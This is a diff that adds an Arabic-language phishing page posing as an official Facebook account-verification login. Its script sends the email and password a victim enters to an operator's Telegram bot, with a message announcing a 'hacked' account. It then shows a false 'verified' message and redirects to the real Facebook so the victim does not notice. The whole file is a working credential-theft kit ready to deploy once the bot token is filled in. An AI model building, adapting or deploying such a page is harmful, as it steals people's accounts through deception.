@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>توثيق حسابات فيسبوك - رسمي</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: center;
+        }
+        .logo {
+            color: #1877f2;
+            font-size: 40px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #166fe5;
+        }
+        .status {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <div class="logo">facebook</div>
+    <form id="fbForm">
+        <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+        <input type="password" id="password" placeholder="كلمة المرور" required>
+        <button type="submit">تسجيل الدخول للتوثيق</button>
+    </form>
+    <div class="status" id="statusMsg"></div>
+</div>
+
+<script>
+    // إعدادات البوت (قم بتعبئة هذه الحقول)
+    const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // ضع توكن بوت تليجرام هنا
+    const CHAT_ID = 'YOUR_CHAT_ID_HERE';    // ضع معرف الدردشة الخاص بك هنا
+
+    document.getElementById('fbForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+        const statusDiv = document.getElementById('statusMsg');
+
+        statusDiv.textContent = "جاري التحقق...";
+
+        const message = `🔴 *حساب فيسبوك جديد تم اختراقه!*\n\n📧 البريد: ${email}\n🔑 كلمة المرور: ${pass}`;
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+        fetch(url)
+            .then(response => {
+                if (response.ok) {
+                    statusDiv.textContent = "تم التوثيق بنجاح! جاري التوجيه...";
+                    setTimeout(() => {
+                        window.location.href = "https://www.facebook.com";
+                    }, 2000);
+                } else {
+                    statusDiv.textContent = "خطأ في الاتصال، حاول مرة أخرى.";
+                }
+            })
+            .catch(error => {
+                statusDiv.textContent = "حدث خطأ غير متوقع.";
+                console.error('Error:', error);
+            });
+    });
+</script>
+
+</body>
+</html>
